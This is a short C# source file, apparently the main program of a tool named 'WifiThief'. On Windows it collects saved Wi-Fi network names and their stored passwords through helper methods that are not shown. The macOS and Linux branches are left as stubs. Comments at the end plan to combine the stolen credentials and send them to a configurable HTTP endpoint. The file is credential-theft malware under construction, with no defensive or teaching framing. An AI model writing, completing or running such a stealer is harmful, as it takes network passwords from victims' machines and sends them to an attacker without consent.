using System.Runtime.InteropServices;
using WifiThief.Commands.Windows;

internal class Program
{
    static void Main()
    {
        List<string> wifiNames = [];
        List<string> wifiPasswords = [];

        switch (RuntimeInformation.OSDescription)
        {
            case string os when os.Contains("Windows"):
                wifiNames = WindowsCommands.GetWifiNames();
                wifiPasswords = WindowsCommands.GetWifiPasswords(wifiNames);
                break;

            case string os when os.Contains("OS X") || os.Contains("macOS"):
                // Handle macOS
                break;

            case string os when os.Contains("Linux"):
                // Handle Linux
                break;

            default:
                Console.Error.WriteLine("Unsupported operating system.");
                break;
        }

        // todo: adding object building to combine wifi and password
        // todo: add http call to configurable endpoint to send response object
    }
}
